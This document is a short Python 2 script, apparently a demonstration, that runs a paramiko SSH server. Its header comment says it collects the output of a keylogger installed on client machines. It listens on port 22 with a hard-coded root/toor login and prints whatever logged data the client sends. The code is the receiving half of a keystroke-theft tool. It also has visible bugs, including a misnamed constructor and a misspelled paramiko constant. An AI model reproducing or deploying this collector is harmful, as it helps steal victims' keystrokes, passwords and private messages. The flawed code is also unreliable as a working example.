#########################################
#
# This is a demonstration of a server which will listen for ssh and sftp connections from client to receive
# a known file which is the output of a keylogger installed on that client
#
#########################################

import socket
import paramiko
import threading
import sys

#host_key = paramiko.RSAKey(filename='test_rsa.key')


class Server(paramiko.ServerInterface):
    def _init_(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITEDP

    def check_auth_password(self, username, password):
        if (username == 'root') and (password == 'toor'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED


def keyloggerServer():
    host_key = paramiko.RSAKey(filename='test_rsa.key')
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('<Your SSH Server IP>', 22))
        sock.listen(100)
        print '[+] Listening for connection .. '
        client, addr = sock.accept()
    except Exception, e:
        print '[-] Listen/bind/accept failed: ' + str(e)
        sys.exit(1)
    print '[+] Got a connection'

    try:
        t = paramiko.Transport(client)
        try:
            t.load_server_moduli()
        except:
            print '[-] (Failed to load moduli -- gex will be unsupported)'
            raise
        t.add_server_key(host_key)
        server = Server()
        try:
            t.start_server(server=server)
        except paramiko.SSHException, x:
            print '[-] SSH negotiation failed.'

        chan = t.accept(20)
        print '[+] Authenticated!'
        while True:
            received = chan.recv(1024)
            print received
            if received == 'exit':
                t.close()
                sys.exit(0)


    except Exception, e:
        print '[-] Caught Exception: ' + str(e)
        t.close(1)
        sys.exit(1)

    try:
        t.close()
    except:
        pass
    sys.exit(1)

keyloggerServer()